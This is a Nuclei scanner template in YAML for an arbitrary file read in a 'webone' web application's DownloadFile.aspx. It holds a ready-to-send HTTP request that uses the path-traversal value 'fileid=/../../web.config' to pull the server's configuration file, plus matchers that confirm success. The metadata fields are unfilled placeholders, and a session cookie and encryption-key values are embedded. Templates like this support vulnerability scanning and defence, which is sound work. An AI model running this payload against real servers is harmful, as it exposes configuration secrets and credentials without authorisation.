id: webone-DownloadFile

info:
  name: DownloadFile 任意文件读取
  author: proud
  severity: high
  description: description
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |+
        GET /webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: ASP.NET_SessionId=kqf2bud1vrpe2wl5tafxei23; IsOpen=MA%3D%3D; EncryType=QUVT; EncryKey=MTIzNDU2MDEyMzQ1Njc4OQ%3D%3D
        Connection: keep-alive


    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - application/octet-stream
      - type: status
        status:
          - 200
